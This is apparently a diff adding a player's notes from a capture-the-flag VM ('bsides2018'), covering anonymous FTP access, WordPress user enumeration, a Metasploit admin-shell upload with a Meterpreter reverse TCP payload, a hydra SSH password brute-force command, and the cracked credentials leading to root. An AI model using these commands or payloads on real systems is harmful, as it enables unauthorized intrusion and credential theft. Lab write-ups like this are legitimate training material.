@@ -1,0 +1,74 @@
+IP Address: 192.168.83.124
+Ports: 21,22,80
+
+21 - FTP vsftpd 2.3.5 (anonymous login allowed)
+22 - SSH OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
+80 - HTTP Apache httpd 2.2.22 ((Ubuntu))
+
+
+/robots.txt
+shows /backup_wordpress
+
+FTP
+anonymous login (anonymous)
+file: users.txt.bk
+
+users.txt.bk :
+abatchy
+john
+mai
+anne
+doomguy
+
+WORDPRESS
+wpscan
+
+users: admin, john
+john :: enigma
+admin ??? took too long
+
+possible shell vuln
+PHPMailer (no)
+WP_Query SQL Injection (no)
+$wpdb->prepare() potential SQL Injection
+WordPress 2.3.0-4.7.4 - Authenticated SQL injection
+akismet - v3.1.10 maybe?
+
+all no
+
+used unix/webapp/wp_admin_shell_upload with payload php/meterpreter/reverse_tcp
+
+
+searching through files
+/etc/sshd_config
+/etc/group
+abatchy - sudo, ssh passauth no
+john - ssh passauth no
+mai - ssh passauth no
+anne - sudo, ssh passauth YES
+doomguy - ssh passauth no
+
+
+
+SSH
+
+hydra -l anne -P /usr/share/wordlists/nmap.lst 192.168.83.124 ssh -t4
+anne::princess
+
+sudo su
+
+flag.txt
+
+root@bsides2018:~# cat flag.txt 
+Congratulations!
+
+If you can read this, that means you were able to obtain root permissions on this VM.
+You should be proud!
+
+There are multiple ways to gain access remotely, as well as for privilege escalation.
+Did you find them all?
+
+@abatchy17
+
+
+ 
